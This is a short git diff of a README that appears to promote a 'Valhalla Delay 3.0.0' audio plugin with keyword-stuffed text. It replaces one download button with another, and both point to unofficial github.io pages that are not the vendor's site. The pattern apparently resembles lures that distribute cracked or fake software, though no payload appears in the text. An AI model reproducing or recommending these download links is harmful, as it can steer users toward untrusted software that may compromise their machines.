@@ -21,7 +21,7 @@ To begin using this **Valhalla Delay 3.0.0 reverb plugin** and **Valhalla Delay 
 | :--- | :--- |
 | **Get Valhalla Delay 3.0.0** | Click the button below to start using this **Valhalla Delay 3.0.0 mixing tool**. |
 
-[![Button](https://img.shields.io/badge/🎛️-Get_Valhalla_Delay_3.0.0-2ea44f?style=for-the-badge)](https://richard2275786.github.io/.github/valhalla-delay-3-0-0)
+[![Valhalla Delay](https://img.shields.io/badge/Try-Valhalla%20Delay%20-8B5CF6?style=for-the-badge)](https://valhalla-delay-review.github.io/.github/valhalla-delay)
 
 ## System Requirements
 
